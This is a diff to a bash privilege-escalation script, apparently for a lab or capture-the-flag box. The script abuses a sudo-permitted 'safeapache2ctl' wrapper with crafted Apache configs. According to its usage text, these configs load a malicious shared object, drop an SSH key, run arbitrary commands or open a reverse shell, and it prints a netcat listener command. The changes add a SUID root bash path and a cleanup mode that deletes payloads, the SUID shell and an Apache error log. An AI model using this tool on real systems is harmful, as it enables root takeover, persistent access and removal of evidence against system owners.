@@ -9,6 +9,7 @@ set -e
 CONF_DIR="/tmp/apache_privesc"
 SO_PAYLOAD="$CONF_DIR/root.so"
 CONFIG_FILE="$CONF_DIR/payload.conf"
+SUID_SHELL="/tmp/rootbash"
 
 mkdir -p "$CONF_DIR"
 
@@ -104,12 +105,21 @@ EOF
     echo "[!] Start a listener with: nc -lvnp $LPORT"
 }
 
+cleanup() {
+    echo "[*] Cleaning up..."
+    rm -f "$SO_PAYLOAD" "$CONF_DIR/root.c" "$CONFIG_FILE" 2>/dev/null || true
+    rm -f "$SUID_SHELL" 2>/dev/null || true
+    rm -f /tmp/apache_error.log 2>/dev/null || true
+    echo "[+] Removed payloads, configs, and artifacts."
+}
+
 usage() {
     echo "Usage:"
     echo "  $0 so            # build .so payload and config (LoadFile)"
     echo "  $0 key <pubkey>  # build CustomLog config to drop pubkey"
     echo "  $0 cmd <command> # build ErrorLog config to run command"
     echo "  $0 rev <LHOST> <LPORT> # build ErrorLog config for reverse shell"
+    echo "  $0 clean         # remove artifacts (configs, .so, suid bash)"
 }
 
 banner
@@ -131,14 +141,16 @@ case "$1" in
         shift
         make_revshell_conf "$1" "$2"
         ;;
+    clean)
+        cleanup
+        ;;
     *)
         usage
         exit 1
         ;;
 esac
 
-echo "[*] Done. Run with:"
-echo "    sudo /usr/local/bin/safeapache2ctl -f $CONFIG_FILE start"
-
-##
-##
+if [[ "$1" != "clean" ]]; then
+    echo "[*] Done. Run with:"
+    echo "    sudo /usr/local/bin/safeapache2ctl -f $CONFIG_FILE start"
+fi
